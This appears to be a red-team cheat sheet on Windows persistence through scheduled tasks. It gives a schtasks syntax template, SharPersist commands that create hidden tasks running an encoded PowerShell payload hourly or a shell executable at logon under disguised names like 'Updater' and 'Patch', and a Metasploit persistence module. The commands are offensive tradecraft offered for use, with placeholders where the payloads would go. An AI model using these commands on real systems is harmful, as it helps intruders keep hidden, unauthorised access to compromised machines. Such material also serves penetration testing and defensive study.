# Schtasks

## 01 - Command Prompt

`C:\> schtasks /create /tn <task_name> /sc <minute | hourly | daily | weekly | monthly | once | onstart | onlogon | onidle> /st HH:MM:SS /st <MM/DD/YYYY> /sd <MM/DD/YYYY> /tr <commands>`

## 02 - SharPersist

```
C:\> SharPersist.exe -t schtask -c "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc <base64_encoded>" -n "Updater" -m add -o hourly

C:\> SharPersist.exe -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c C:\path\to\shell.exe" -n "Patch" -m add -o logon

C:\> SharPersist.exe -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c C:\path\to\shell.exe" -n "Patch" -m check

C:\> SharPersist.exe -t schtaskbackdoor -m list -o logon
```

## 03 - Metasploit

```
msf > use exploit/windows/local/s4u_persistence
```

## References

- [Mandiant: SharPersist Windows Persistence Toolkit](https://www.mandiant.com/resources/sharpersist-windows-persistence-toolkit)

- [Zweilosec: Windows RedTeam Persistence](https://zweilosec.gitbook.io/hackers-rest/windows-1/windows-redteam/persistence)

- [Persistence Info](https://persistence-info.github.io/)

- [Persistence Scheduled Tasks](https://pentestlab.blog/2019/11/04/persistence-scheduled-tasks/)

- [Cobalt Strike: Schtasks Persistence with Powershell one liners](https://www.cobaltstrike.com/blog/schtasks-persistence-with-powershell-one-liners/)